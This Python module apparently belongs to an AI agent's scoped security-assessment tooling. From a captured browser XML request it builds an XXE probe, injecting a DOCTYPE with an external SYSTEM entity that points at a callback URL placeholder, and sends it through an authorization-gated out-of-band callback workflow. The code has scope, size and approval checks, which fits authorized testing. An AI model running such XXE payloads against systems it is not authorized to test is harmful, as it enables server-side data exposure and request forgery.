"""Bounded XXE probe derived from one private, browser-observed XML request.

The model selects an observed coverage cell and a technique. It never supplies
the XML body, callback destination, cookies, or the request target.
"""

from __future__ import annotations

import base64
import binascii
import json
import re
from urllib.parse import urlsplit
from xml.etree import ElementTree

from app.services.agent.scoped_assessment.browser import assert_in_scope
from app.services.agent.scoped_assessment.body_probe import safe_replay_headers


MAX_XML_BYTES = 16_000
_ROOT = re.compile(r"\A\s*(?:<\?xml\s+[^<>]*\?>\s*)?<(?P<name>[A-Za-z_][\w:.-]*)(?=[\s/>])")
_LEAF = re.compile(
    r"<(?P<name>[A-Za-z_][\w:.-]*)(?:\s+[^<>]*?)?>"
    r"(?P<value>[A-Za-z0-9 _.-]{1,80})</(?P=name)\s*>"
)
_FORBIDDEN = re.compile(r"<!\s*(?:DOCTYPE|ENTITY)\b", re.I)


def plan_xml_entity_probe(private_exchange: bytes, *, allowed_origin: str,
                          expected_path: str) -> dict[str, str]:
    """Preserve the observed request and change one simple XML text node."""
    try:
        captured = json.loads(private_exchange)
    except (UnicodeDecodeError, ValueError) as exc:
        raise ValueError("Invalid captured XML exchange") from exc
    if (not isinstance(captured, dict) or captured.get("method") != "POST"
            or captured.get("resource_type") not in {"xhr", "fetch"}):
        raise ValueError("XXE probe requires a browser-observed POST XHR/fetch")
    url = captured.get("url")
    if not isinstance(url, str):
        raise ValueError("Captured XML URL is missing")
    assert_in_scope(url, [allowed_origin])
    parts = urlsplit(url)
    if parts.query or parts.fragment or (parts.path or "/") != expected_path:
        raise ValueError("XML capture does not match the assigned endpoint")
    mime = str(captured.get("request_content_type") or "").split(";", 1)[0].strip().lower()
    if mime not in {"application/xml", "text/xml"} and not mime.endswith("+xml"):
        raise ValueError("Observed request did not use XML")
    try:
        body = base64.b64decode(captured.get("request_body_base64", ""), validate=True)
        raw = body.decode("utf-8")
    except (binascii.Error, UnicodeDecodeError, TypeError, ValueError) as exc:
        raise ValueError("Captured XML body is invalid") from exc
    if not body or len(body) > MAX_XML_BYTES or _FORBIDDEN.search(raw):
        raise ValueError("Captured XML is empty, oversized, or contains a DTD")
    root = _ROOT.match(raw)
    leaf = _LEAF.search(raw)
    if not root or not leaf:
        raise ValueError("Observed XML has no safe text node for a bounded probe")
    try:
        ElementTree.fromstring(raw)
    except ElementTree.ParseError as exc:
        raise ValueError("Captured XML is malformed") from exc
    original = leaf.group("value")
    changed = raw[:leaf.start("value")] + "&prowl;" + raw[leaf.end("value"):]
    declaration = re.match(r"\s*<\?xml\s+[^<>]*\?>", changed)
    at = declaration.end() if declaration else 0
    control = changed[:at] + f'<!DOCTYPE {root.group("name")} [<!ENTITY prowl "{original}">]>' + changed[at:]
    callback = (changed[:at] + f'<!DOCTYPE {root.group("name")} '
                '[<!ENTITY prowl SYSTEM "{{callback_url}}">]>' + changed[at:])
    if max(len(control), len(callback)) > MAX_XML_BYTES:
        raise ValueError("XML mutation exceeds replay limit")
    return {"url": url, "mime": mime, "control_body": control,
            "callback_body": callback, "headers": safe_replay_headers(private_exchange)}


async def send_xml_callback(manager, plan: dict, *, identity: str) -> dict:
    """Use the existing approval-gated, freshly registered callback workflow."""
    if not getattr(manager, "_oob_callbacks_allowed", False):
        raise ValueError("Out-of-band callbacks were not authorized for this run")
    manager._scoped_claim_posts(1)
    # The outer scoped tool is recorded. Use the gated inner dispatcher here so
    # the private captured XML is not copied into the generic invocation log.
    wrapped = await manager._execute_impl("run_oob_callback_workflow", {
        "url": plan["url"], "method": "POST", "location": "raw", "field": "",
        "headers": {**plan["headers"], "Content-Type": plan["mime"]},
        "body": plan["callback_body"], "identity": identity,
        "use_auth_session": False, "poll_attempts": 4,
        "summary_only": True,
    })
    result = wrapped.get("output") if isinstance(wrapped, dict) else None
    if isinstance(result, str):
        try:
            result = json.loads(result)
        except ValueError:
            result = None
    if not isinstance(result, dict) or result.get("success") is not True:
        raise ValueError("The approved XML callback workflow did not complete")
    return result
